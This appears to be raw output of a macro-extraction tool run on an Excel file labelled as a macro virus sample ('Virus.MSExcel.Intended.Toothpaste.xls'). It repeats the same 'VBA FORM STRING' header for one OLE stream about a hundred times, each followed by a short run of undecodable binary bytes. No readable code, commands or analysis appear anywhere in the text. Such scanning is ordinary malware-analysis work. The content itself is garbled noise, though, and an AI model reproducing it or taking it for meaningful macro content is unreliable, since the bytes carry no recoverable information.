VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?!�ql�<ϫՓ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�l�$y�jWJ��&���&�7�b�ձ	�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Kj'�V=����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k/�D���G�"
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��"#E���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^ �p����P׸�9�m^";a�H�3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ��3�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\&��u�,xf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Q,.�᜹�~���m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Z��X�甕
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��r��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@���F)U�RuGL��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��>�Dl1��wwf�d���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M/�
Ѩ�9�N'��\	h΀�T�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R�'�};�]�¢$��~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
4=^���Пc�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k�;w�k�X�w@ 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*m�/=	���T7�	�T~��X��p>�K�/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �@~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��]�L�m�Ƴ��O欹#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��)],�%h��Oġ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���xEJ�~41
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+|W��n��T�	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

i���C�|�`��G�[k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
tT�F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k��'���ȩX�̱��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�gb��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>�>�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����N�Z�k�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��3�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�pq/�������ʘ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��~�{U�w
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
̻��fk��b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+(U��N�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D1/˨UL>��
z�`��^M���d
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�\�R���x
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
h�ee\
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ޮ|W�mQ�v��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ց��/��.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&\BA�s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�觅x�Kr�q�*�5�i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�HT�i�ʃ��Cd��18ɬ:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%���?�W?KFLw�����`���ƅZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l��*��,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$dz.ާ�µ18��W2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�^Ƽ����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p��giu?�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�W�]%O�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�˙���G��#�4nT	���b\'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�t�{�)?EEC���_�_M�T`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�_�tu�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ԇ[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ª]V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�F[�#J3P�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
߂��^l#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
e֒�F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��V��z�ʮ��,!�����O�Ί�V&����f,�u�fX=�b�`a>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;\ߠ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ޣ�EC�Q!�2�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��/lS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*k%E`�Nc
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��2�I�J�.3/�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ɒX/�"D�Rb Υ¬�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�1*)ڝʚ5��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�\�w�pϘE���;";12R���E��Ŀ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ih���$�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��E���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N1m�GlP��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
f��?8j����/��{�0D��\z�,᱆(K�+�^Т����Q�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>�2�`�dw-lbR
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Pe�����gs�e���L�\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�1_���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ታ:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^5���ݑ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
g�B��/��=s�8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[�}w��?R
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<�*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pJ��"(	�/�)x�=G�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
pq-���5m�S"{"3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�>���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)��ơ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��C�`�N��%E.1øG#�yeu
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ID�F=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ւX0��6�^/
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0���}tR8� ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Xu�A��.9n䕸ޥ�qG�"��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w��M�8��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ��2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2>-����_L��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'�L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���'1`ni�(��(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�;��b�c����j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Qv�.[�j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�L�|LoS7�M�P��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��C�9;@���Ć�k¡�s�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�A���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#Ԫ�Ve��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��@�om
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5���]A +��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3P��QԶ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a#�ݓ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��q*Ǩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�D��B	F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4X	�M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�b�F^�ؙ�.ĸw�����+F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9�\p3�ba��S��U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+����F
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�h�B�dĥјR�/1ঋ1�[L0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSExcel.Intended.Toothpaste.xls' - OLE stream: '_VBA_PROJECT_CUR/AIM/o'
